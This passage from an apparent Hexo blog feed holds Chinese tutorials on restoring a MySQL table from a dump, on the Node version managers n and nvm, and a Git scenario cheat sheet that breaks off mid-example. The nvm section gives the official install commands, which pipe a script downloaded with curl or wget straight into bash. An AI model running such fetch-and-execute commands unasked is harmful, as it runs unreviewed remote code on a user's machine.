class="string">'b1'</span>);</span><br></pre></td></tr></table></figure><p>确认了数据之后无误之后，就开始恢复了。</p><ol start="3"><li>恢复被删除表的表结构</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip -c dbtest_2022-04-09.sql.gz | sed -e <span class="string">'/./&#123;H;$!d;&#125;'</span> -e <span class="string">'x;/CREATE TABLE `tb2`/!d;q'</span> | mysql -uroot -p test_dump</span><br></pre></td></tr></table></figure><ol start="4"><li>从备份文件中恢复被删除表的数据</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip -c dbtest_2022-04-09.sql.gz | grep --ignore-case  <span class="string">'insert into `tb2`'</span>| mysql -uroot -p test_dump</span><br></pre></td></tr></table></figure><p>查看目标表，数据已经恢复：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tb2;</span><br><span class="line">+----+------+------+------+</span><br><span class="line">| id | name | val  | memo |</span><br><span class="line">+----+------+------+------+</span><br><span class="line">|  1 | a    |    2 | a2   |</span><br><span class="line">|  2 | a    |    1 | a1   |</span><br><span class="line">|  3 | a    |    3 | a3   |</span><br><span class="line">|  5 | b    |    3 | b3   |</span><br><span class="line">|  6 | b    |    2 | b2   |</span><br><span class="line">|  7 | b    |    4 | b4   |</span><br><span class="line">|  8 | b    |    5 | b5   |</span><br><span class="line">|  9 | b    |    1 | b1   |</span><br><span class="line">+----+------+------+------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><blockquote><p>注意：实际使用时以上命令中的部分文件名或表名需要替换成你自己的。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node 版本控制工具</title>
      <link href="/node-version-control-tool/"/>
      <url>/node-version-control-tool/</url>
      
        <content type="html"><![CDATA[<p>主流的 Node.js 版本管理工具有 n 和 nvm，两者都是使用 shell 脚本实现，本文会逐一介绍。</p><a id="more"></a><h2 id="n"><a href="#n" class="headerlink" title="n"></a>n</h2><p><a href="https://github.com/tj/n" target="_blank" rel="noopener">n</a> 是Node的一个模块，作者是TJ Holowaychuk（鼎鼎大名的[Express]框架作者），就像它的名字一样，它的理念就是简单。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo npm install -g n</span><br></pre></td></tr></table></figure><h3 id="版本切换"><a href="#版本切换" class="headerlink" title="版本切换"></a>版本切换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n x.x.x</span><br></pre></td></tr></table></figure><h3 id="安装某个版本"><a href="#安装某个版本" class="headerlink" title="安装某个版本"></a>安装某个版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n x.x.x</span><br></pre></td></tr></table></figure><h3 id="安装最新版本"><a href="#安装最新版本" class="headerlink" title="安装最新版本"></a>安装最新版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n latest</span><br></pre></td></tr></table></figure><h3 id="安装稳定版本"><a href="#安装稳定版本" class="headerlink" title="安装稳定版本"></a>安装稳定版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n stable</span><br></pre></td></tr></table></figure><h3 id="删除某个版本"><a href="#删除某个版本" class="headerlink" title="删除某个版本"></a>删除某个版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n rm x.x.x</span><br></pre></td></tr></table></figure><h3 id="指定某个版本来执行文件"><a href="#指定某个版本来执行文件" class="headerlink" title="指定某个版本来执行文件"></a>指定某个版本来执行文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n user x.x.x some.js</span><br></pre></td></tr></table></figure><h2 id="nvm"><a href="#nvm" class="headerlink" title="nvm"></a>nvm</h2><p><a href="https://github.com/nvm-sh/nvm" target="_blank" rel="noopener">nvm</a> 全称Node Version Manager。</p><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>nvm 项目提供了一个 install.sh 脚本帮助用户快速安装，可以使用 cURL 或 Wget 等工具下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash</span><br></pre></td></tr></table></figure><p>运行上面命令中的任意一条，就会下载并运行 v0.39.1 版本的 nvm，默认安装位置为 <del>/.nvm，并会在一些配置文件中添加如下代码片段，例如 ~/.bash_profile、</del>/.zshrc、~/.profile 或 ~/.bashrc。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">"([ -z "</span>&#123;XDG_CONFIG_HOME-&#125;<span class="string">" ] &amp;&amp; printf %s "</span>&#123;HOME&#125;/.nvm<span class="string">" || printf %s "</span>&#123;XDG_CONFIG_HOME&#125;/nvm<span class="string">")"</span></span><br><span class="line">[ -s <span class="string">"NVM_DIR/nvm.sh"</span> ] &amp;&amp; \. <span class="string">"NVM_DIR/nvm.sh"</span> <span class="comment"># This loads nvm</span></span><br></pre></td></tr></table></figure><p>下载、编译和安装 node 的最新版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install node  <span class="comment"># "node" 是最新版本的别名</span></span><br></pre></td></tr></table></figure><p>也可以指定安装版本，例如 v14.17.4</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install 14.17.4</span><br></pre></td></tr></table></figure><p>如果不知道哪些版本可以正常使用，可以先列出所有可用版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm ls-remote</span><br></pre></td></tr></table></figure><h3 id="版本切换-1"><a href="#版本切换-1" class="headerlink" title="版本切换"></a>版本切换</h3><p>使用指定版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm use 14.17.4</span><br></pre></td></tr></table></figure><p>需要注意的是这个只是临时使用该版本，当环境发生变化之后，node 又会恢复之前的版本。</p><h3 id="查看正在使用的版本"><a href="#查看正在使用的版本" class="headerlink" title="查看正在使用的版本"></a>查看正在使用的版本</h3><p>查看当前所使用的 node 版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm current</span><br></pre></td></tr></table></figure><h3 id="查看当前已经安装的版本"><a href="#查看当前已经安装的版本" class="headerlink" title="查看当前已经安装的版本"></a>查看当前已经安装的版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm ls</span><br></pre></td></tr></table></figure><h3 id="指定某个版本来执行文件-1"><a href="#指定某个版本来执行文件-1" class="headerlink" title="指定某个版本来执行文件"></a>指定某个版本来执行文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm run x.x.x some.js</span><br></pre></td></tr></table></figure><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><p>如何使得某个版本变为默认版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm <span class="built_in">alias</span> default v14.17.4</span><br></pre></td></tr></table></figure><p>获取对应版本的安装路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm <span class="built_in">which</span> 14.17.4</span><br></pre></td></tr></table></figure><p>需要注意的是，npm 的版本切换，没有具体的命令，只要控制 node 版本就行，npm 版本会随之变化。</p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git 经典操作场景整理，专治不会合代码</title>
      <link href="/the-classic-operation-scene-of-git-is-organized/"/>
      <url>/the-classic-operation-scene-of-git-is-organized/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文链接：<a href="https://mp.weixin.qq.com/s/oY6D5E3h5K36aMJQ6AZlVQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/oY6D5E3h5K36aMJQ6AZlVQ</a></p></blockquote><p>git 对于大家应该都不太陌生，熟练使用 git 已经成为程序员的一项基本技能，尽管在工作中有诸如 <code>Sourcetree</code> 这样牛X的客户端工具，使得合并代码变的很方便。但找工作面试和一些需彰显个人实力的场景，仍然需要我们掌握足够多的 git 命令。</p><p>本文整理了一些日常使用 git 合代码的经典操作场景，基本覆盖了工作中的需求。</p><a id="more"></a><h2 id="提交-Commit"><a href="#提交-Commit" class="headerlink" title="提交(Commit)"></a>提交(Commit)</h2><h3 id="我刚才提交了什么"><a href="#我刚才提交了什么" class="headerlink" title="我刚才提交了什么?"></a>我刚才提交了什么?</h3><p>如果你用 <code>git commit -a</code> 提交了一次变化(changes)，而你又不确定到底这次提交了哪些内容。你就可以用下面的命令显示当前<code>HEAD</code>上的最近一次的提交(commit):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git show</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> -n1 -p</span><br></pre></td></tr></table></figure><h3 id="我的提交信息-commit-message-写错了"><a href="#我的提交信息-commit-message-写错了" class="headerlink" title="我的提交信息(commit message)写错了"></a>我的提交信息(commit message)写错了</h3><p>如果你的提交信息(<code>commit message</code>)写错了且这次提交(commit)还没有推(push), 你可以通过下面的方法来修改提交信息(<code>commit message</code>):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git commit --amend --only</span><br></pre></td></tr></table></figure><p>这会打开你的默认编辑器, 在这里你可以编辑信息. 另一方面, 你也可以用一条命令一次完成:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git commit --amend --only -m <span class="string">'xxxxxxx'</span></span><br></pre></td></tr></table></figure><p>如果你已经推(push)了这次提交(commit), 你可以修改这次提交(commit)然后强推(<code>force push</code>), 但是不推荐这么做。</p><h3 id="我提交-commit-里的用户名和邮箱不对"><a href="#我提交-commit-里的用户名和邮箱不对" class="headerlink" title="我提交(commit)里的用户名和邮箱不对"></a>我提交(commit)里的用户名和邮箱不对</h3><p>如果这只是单个提交(commit)，修改它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git commit --amend --author <span class="string">"New Authorname &lt;authoremail@mydomain.com&gt;"</span></span><br></pre></td></tr></table></figure><p>如果你需要修改所有历史, 参考 ‘git filter-branch’的指南页.</p><h3 id="我想从一个提交-commit-里移除一个文件"><a href="#我想从一个提交-commit-里移除一个文件" class="headerlink" title="我想从一个提交(commit)里移除一个文件"></a>我想从一个提交(commit)里移除一个文件</h3><p>通过下面的方法，从一个提交(commit)里移除一个文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout HEAD^ myfile  </span><br><span class="line">$ git add -A  </span><br><span class="line">$ git commit --amend</span><br></pre></td></tr></table></figure><p>这将非常有用，当你有一个开放的补丁(<code>open patch</code>)，你往上面提交了一个不必要的文件，你需要强推(<code>force push</code>)去更新这个远程补丁。</p><h3 id="我想删除我的的最后一次提交-commit"><a href="#我想删除我的的最后一次提交-commit" class="headerlink" title="我想删除我的的最后一次提交(commit)"></a>我想删除我的的最后一次提交(commit)</h3><p>如果你需要删除推了的提交(<code>pushed commits</code>)，你可以使用下面的方法。可是，这会不可逆的改变你的历史，也会搞乱那些已经从该仓库拉取(pulled)了的人的历史。简而言之，如果你不是很确定，千万不要这么做。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git reset HEAD^ --hard  </span><br><span class="line">$ git push -f [remote] [branch]</span><br></pre></td></tr></table></figure><p>如果你还没有推到远程, 把Git重置(reset)到你最后一次提交前的状态就可以了(同时保存暂存的变化):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch*)$ git reset --soft HEAD@&#123;1&#125;</span><br></pre></td></tr></table></figure><p>这只能在没有推送之前有用. 如果你已经推了, 唯一安全能做的是 <code>git revert SHAofBadCommit</code>， 那会创建一个新的提交(commit)用于撤消前一个提交的所有变化(changes)；或者, 如果你推的这个分支是rebase-safe的 (例如：其它开发者不会从这个分支拉), 只需要使用 <code>git push -f</code>。</p><h3 id="删除任意提交-commit"><a href="#删除任意提交-commit" class="headerlink" title="删除任意提交(commit)"></a>删除任意提交(commit)</h3><p>同样的警告：不到万不得已的时候不要这么做.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git rebase --onto SHA1_OF_BAD_COMMIT^ SHA1_OF_BAD_COMMIT  </span><br><span class="line">$ git push -f [remote] [branch]</span><br></pre></td></tr></table></figure><p>或者做一个 交互式rebase 删除那些你想要删除的提交(commit)里所对应的行。</p><h3 id="我尝试推一个修正后的提交-amended-commit-到远程，但是报错："><a href="#我尝试推一个修正后的提交-amended-commit-到远程，但是报错：" class="headerlink" title="我尝试推一个修正后的提交(amended commit)到远程，但是报错："></a>我尝试推一个修正后的提交(amended commit)到远程，但是报错：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">To https:&#x2F;&#x2F;github.com&#x2F;yourusername&#x2F;repo.git  </span><br><span class="line">! [rejected]        mybranch -&gt; mybranch (non-fast-forward)  </span><br><span class="line">error: failed to push some refs to &#39;https:&#x2F;&#x2F;github.com&#x2F;tanay1337&#x2F;webmaker.org.git&#39;  </span><br><span class="line">hint: Updates were rejected because the tip of your current branch is behind  </span><br><span class="line">hint: its remote counterpart. Integrate the remote changes (e.g.  </span><br><span class="line">hint: &#39;git pull ...&#39;) before pushing again.  </span><br><span class="line">hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details.</span><br></pre></td></tr></table></figure><p>注意, rebasing(见下面)和修正(amending)会用一个<strong>新的提交(commit)代替旧的</strong>, 所以如果之前你已经往远程仓库上推过一次修正前的提交(commit)，那你现在就必须强推(<code>force push</code>) (<code>-f</code>)。注意 – <em>总是</em> 确保你指明一个分支!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git push origin mybranch -f</span><br></pre></td></tr></table></figure><p>一般来说, <strong>要避免强推</strong>. 最好是创建和推(push)一个新的提交(commit)，而不是强推一个修正后的提交。后者会使那些与该分支或该分支的子分支工作的开发者，在源历史中产生冲突。</p><h3 id="我意外的做了一次硬重置-hard-reset-，我想找回我的内容"><a href="#我意外的做了一次硬重置-hard-reset-，我想找回我的内容" class="headerlink" title="我意外的做了一次硬重置(hard reset)，我想找回我的内容"></a>我意外的做了一次硬重置(hard reset)，我想找回我的内容</h3><p>如果你意外的做了 <code>git reset --hard</code>, 你通常能找回你的提交(commit), 因为Git对每件事都会有日志，且都会保存几天。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git reflog</span><br></pre></td></tr></table></figure><p>你将会看到一个你过去提交(commit)的列表, 和一个重置的提交。选择你想要回到的提交(commit)的SHA，再重置一次:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git reset --hard SHA1234</span><br></pre></td></tr></table></figure><p>这样就完成了。</p><h2 id="暂存-Staging"><a href="#暂存-Staging" class="headerlink" title="暂存(Staging)"></a>暂存(Staging)</h2><h3 id="我需要把暂存的内容添加到上一次的提交-commit"><a href="#我需要把暂存的内容添加到上一次的提交-commit" class="headerlink" title="我需要把暂存的内容添加到上一次的提交(commit)"></a>我需要把暂存的内容添加到上一次的提交(commit)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(my-branch*)$ git commit --amend</span><br></pre></td></tr></table></figure><h3 id="我想要暂存一个新文件的一部分，而不是这个文件的全部"><a href="#我想要暂存一个新文件的一部分，而不是这个文件的全部" class="headerlink" title="我想要暂存一个新文件的一部分，而不是这个文件的全部"></a>我想要暂存一个新文件的一部分，而不是这个文件的全部</h3><p>一般来说, 如果你想暂存一个文件的一部分, 你可这样做:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add --patch filename.x</span><br></pre></td></tr></table></figure><p><code>-p</code> 简写。这会打开交互模式， 你将能够用 <code>s</code> 选项来分隔提交(commit)；然而, 如果这个文件是新的, 会没有这个选择， 添加一个新文件时, 这样做:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add -N filename.x</span><br></pre></td></tr></table></figure><p>然后, 你需要用 <code>e</code> 选项来手动选择需要添加的行，执行 <code>git diff --cached</code> 将会显示哪些行暂存了哪些行只是保存在本地了。</p><h3 id="我想把在一个文件里的变化-changes-加到两个提交-commit-里"><a href="#我想把在一个文件里的变化-changes-加到两个提交-commit-里" class="headerlink" title="我想把在一个文件里的变化(changes)加到两个提交(commit)里"></a>我想把在一个文件里的变化(changes)加到两个提交(commit)里</h3><p><code>git add</code> 会把整个文件加入到一个提交. <code>git add -p</code> 允许交互式的选择你想要提交的部分.</p><h3 id="我想把暂存的内容变成未暂存，把未暂存的内容暂存起来"><a href="#我想把暂存的内容变成未暂存，把未暂存的内容暂存起来" class="headerlink" title="我想把暂存的内容变成未暂存，把未暂存的内容暂存起来"></a>我想把暂存的内容变成未暂存，把未暂存的内容暂存起来</h3><p>多数情况下，你应该将所有的内容变为未暂存，然后再选择你想要的内容进行commit。但假定你就是想要这么做，这里你可以创建一个临时的commit来保存你已暂存的内容，然后暂存你的未暂存的内容并进行stash。然后reset最后一个commit将原本暂存的内容变为未暂存，最后stash pop回来。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -m <span class="string">"WIP"</span>  </span><br><span class="line">$ git add .  </span><br><span class="line">$ git stash  </span><br><span class="line">$ git reset HEAD^  </span><br><span class="line">$ git stash pop --index 0</span><br></pre></td></tr></table></figure><p>注意1: 这里使用<code>pop</code>仅仅是因为想尽可能保持幂等。注意2: 假如你不加上<code>--index</code>你会把暂存的文件标记为为存储。</p><h2 id="未暂存-Unstaged-的内容"><a href="#未暂存-Unstaged-的内容" class="headerlink" title="未暂存(Unstaged)的内容"></a>未暂存(Unstaged)的内容</h2><h3 id="我想把未暂存的内容移动到一个新分支"><a href="#我想把未暂存的内容移动到一个新分支" class="headerlink" title="我想把未暂存的内容移动到一个新分支"></a>我想把未暂存的内容移动到一个新分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -b my-branch</span><br></pre></td></tr></table></figure><h3 id="我想把未暂存的内容移动到另一个已存在的分支"><a href="#我想把未暂存的内容移动到另一个已存在的分支" class="headerlink" title="我想把未暂存的内容移动到另一个已存在的分支"></a>我想把未暂存的内容移动到另一个已存在的分支</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git stash  </span><br><span class="line">$ git checkout my-branch  </span><br><span class="line">$ git stash pop</span><br></pre></td></tr></table></figure><h3 id="我想丢弃本地未提交的变化-uncommitted-changes"><a href="#我想丢弃本地未提交的变化-uncommitted-changes" class="headerlink" title="我想丢弃本地未提交的变化(uncommitted changes)"></a>我想丢弃本地未提交的变化(uncommitted changes)</h3><p>如果你只是想重置源(origin)和你本地(local)之间的一些提交(commit)，你可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># one commit  </span></span><br><span class="line">(my-branch)$ git reset --hard HEAD^  </span><br><span class="line"><span class="comment"># two commits  </span></span><br><span class="line">(my-branch)$ git reset --hard HEAD^^  </span><br><span class="line"><span class="comment"># four commits  </span></span><br><span class="line">(my-branch)$ git reset --hard HEAD~4  </span><br><span class="line"><span class="comment"># or  </span></span><br><span class="line">(main)$ git checkout -f</span><br></pre></td></tr></table></figure><p>重置某个特殊的文件, 你可以用文件名做为参数:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git reset filename</span><br></pre></td></tr></table></figure><h3 id="我想丢弃某些未暂存的内容"><a href="#我想丢弃某些未暂存的内容" class="headerlink" title="我想丢弃某些未暂存的内容"></a>我想丢弃某些未暂存的内容</h3><p>如果你想丢弃工作拷贝中的一部分内容，而不是全部。</p><p>签出(checkout)不需要的内容，保留需要的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout -p  </span><br><span class="line"><span class="comment"># Answer y to all of the snippets you want to drop</span></span><br></pre></td></tr></table></figure><p>另外一个方法是使用 <code>stash</code>， Stash所有要保留下的内容, 重置工作拷贝, 重新应用保留的部分。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git stash -p  </span><br><span class="line"><span class="comment"># Select all of the snippets you want to save  </span></span><br><span class="line">$ git reset --hard  </span><br><span class="line">$ git stash pop</span><br></pre></td></tr></table></figure><p>或者, stash 你不需要的部分, 然后stash drop。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git stash -p  </span><br><span class="line"><span class="comment"># Select all of the snippets you don't want to save  </span></span><br><span class="line">$ git stash drop</span><br></pre></td></tr></table></figure><h2 id="分支-Branches"><a href="#分支-Branches" class="headerlink" title="分支(Branches)"></a>分支(Branches)</h2><h3 id="我从错误的分支拉取了内容，或把内容拉取到了错误的分支"><a href="#我从错误的分支拉取了内容，或把内容拉取到了错误的分支" class="headerlink" title="我从错误的分支拉取了内容，或把内容拉取到了错误的分支"></a>我从错误的分支拉取了内容，或把内容拉取到了错误的分支</h3><p>这是另外一种使用 <code>git reflog</code> 情况，找到在这次错误拉(pull) 之前HEAD的指向。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git reflog  </span><br><span class="line">ab7555f HEAD@&#123;0&#125;: pull origin wrong-branch: Fast-forward  </span><br><span class="line">c5bc55a HEAD@&#123;1&#125;: checkout: checkout message goes here</span><br></pre></td></tr></table></figure><p>重置分支到你所需的提交(desired commit):</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard c5bc55a</span><br></pre></td></tr></table></figure><p>完成。</p><h3 id="我想扔掉本地的提交-commit-，以便我的分支与远程的保持一致"><a href="#我想扔掉本地的提交-commit-，以便我的分支与远程的保持一致" class="headerlink" title="我想扔掉本地的提交(commit)，以便我的分支与远程的保持一致"></a>我想扔掉本地的提交(commit)，以便我的分支与远程的保持一致</h3><p>先确认你没有推(push)你的内容到远程。</p><p><code>git status</code> 会显示你领先(ahead)源(origin)多少个提交:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(my-branch)$ git status  </span><br><span class="line"><span class="comment"># On branch my-branch  </span></span><br><span class="line"><span class="comment"># Your branch is ahead of 'origin/my-branch' by 2 commits.  </span></span><br><span class="line"><span class="comment">#   (use "git push" to publish your local commits)  </span></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>一种方法是:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git reset --hard origin/my-branch</span><br></pre></td></tr></table></figure><h3 id="我需要提交到一个新分支，但错误的提交到了main"><a href="#我需要提交到一个新分支，但错误的提交到了main" class="headerlink" title="我需要提交到一个新分支，但错误的提交到了main"></a>我需要提交到一个新分支，但错误的提交到了main</h3><p>在main下创建一个新分支，不切换到新分支,仍在main下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git branch my-branch</span><br></pre></td></tr></table></figure><p>把main分支重置到前一个提交:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git reset --hard HEAD^</span><br></pre></td></tr></table></figure><p><code>HEAD^</code> 是 <code>HEAD^1</code> 的简写，你可以通过指定要设置的<code>HEAD</code>来进一步重置。</p><p>或者, 如果你不想使用 <code>HEAD^</code>, 找到你想重置到的提交(commit)的hash(<code>git log</code> 能够完成)， 然后重置到这个hash。使用<code>git push</code> 同步内容到远程。</p><p>例如, main分支想重置到的提交的hash为<code>a13b85e</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git reset --hard a13b85e  </span><br><span class="line">HEAD is now at a13b85e</span><br></pre></td></tr></table></figure><p>签出(checkout)刚才新建的分支继续工作:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(main)$ git checkout my-branch</span><br></pre></td></tr></table></figure><h3 id="我想保留来自另外一个ref-ish的整个文件"><a href="#我想保留来自另外一个ref-ish的整个文件" class="headerlink" title="我想保留来自另外一个ref-ish的整个文件"></a>我想保留来自另外一个ref-ish的整个文件</h3><p>假设你正在做一个原型方案(原文为working spike (see note)), 有成百的内容，每个都工作得很好。现在, 你提交到了一个分支，保存工作内容:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(solution)$ git add -A &amp;&amp; git commit -m <span class="string">"Adding all changes from this spike into one big commit."</span></span><br></pre></td></tr></table></figure><p>当你想要把它放到一个分支里 (可能是<code>feature</code>, 或者 <code>develop</code>), 你关心是保持整个文件的完整，你想要一个大的提交分隔成比较小。</p><p>假设你有:</p><ul><li>分支 <code>solution</code>, 拥有原型方案， 领先 <code>develop</code> 分支。</li><li>分支 <code>develop</code>, 在这里你应用原型方案的一些内容。</li></ul><p>我去可以通过把内容拿到你的分支里，来解决这个问题:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(develop)$ git checkout solution -- file1.txt</span><br></pre></td></tr></table></figure><p>这会把这个文件内容从分支 <code>solution</code> 拿到分支 <code>develop</code> 里来:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># On branch develop  </span></span><br><span class="line"><span class="comment"># Your branch is up-to-date with 'origin/develop'.  </span></span><br><span class="line"><span class="comment"># Changes to be committed:  </span></span><br><span class="line"><span 